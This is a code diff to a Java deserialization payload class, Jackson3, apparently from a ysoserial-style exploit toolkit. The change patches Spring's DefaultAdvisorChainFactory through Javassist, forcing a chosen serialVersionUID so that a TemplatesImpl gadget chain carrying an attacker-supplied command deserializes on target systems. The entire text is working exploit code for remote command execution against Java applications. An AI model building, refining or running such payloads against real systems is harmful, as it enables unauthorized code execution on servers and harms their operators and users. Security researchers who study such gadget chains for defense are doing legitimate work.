@@ -13,6 +13,7 @@ import org.springframework.aop.framework.AdvisedSupport;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
+import org.springframework.aop.framework.AdvisorChainFactory;
 
 import javax.swing.event.EventListenerList;
 import javax.xml.transform.Templates;
@@ -33,6 +34,14 @@ public class Jackson3 implements ObjectPayload<Object> {
     public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
         AdvisedSupport advisedSupport = new AdvisedSupport();
         advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
+
+        POOL.insertClassPath(new ClassClassPath(Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory")));
+        final CtClass ctDefaultAdvisorChainFactory = POOL.get("org.springframework.aop.framework.DefaultAdvisorChainFactory");
+        insertField(ctDefaultAdvisorChainFactory, "serialVersionUID", "private static final long serialVersionUID = 273003553246259276L;");
+        Object cFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();
+
+        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) cFactory);
+
         Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
